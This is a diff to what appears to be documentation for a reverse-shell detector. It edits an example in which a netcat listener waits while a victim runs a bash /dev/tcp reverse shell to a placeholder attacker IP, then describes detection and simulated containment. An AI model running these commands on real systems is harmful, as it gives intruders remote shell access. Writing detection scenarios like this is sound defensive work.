@@ -63,9 +63,10 @@ Attacker starts a listener:
 ```bash
 nc -lv 4444
 ```
-Victim connects back:
+Victim connects back (replace `<attacker-ip>` with the real address; the `bash -c '...'` wrapper is required because
+`/dev/tcp` is a bash feature and zsh, the macOS default shell, would otherwise parse the redirect itself and fail):
 ```bash
-bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1
+bash -c 'bash -i >& /dev/tcp/<attacker-ip>/4444 0>&1'
 ```
 The outbound shell-to-uncommon-port connection is detected within the 10s window; the attacker IP is blocked and
 the shell process is flagged as contained (simulated — the process itself isn't touched, per project policy).
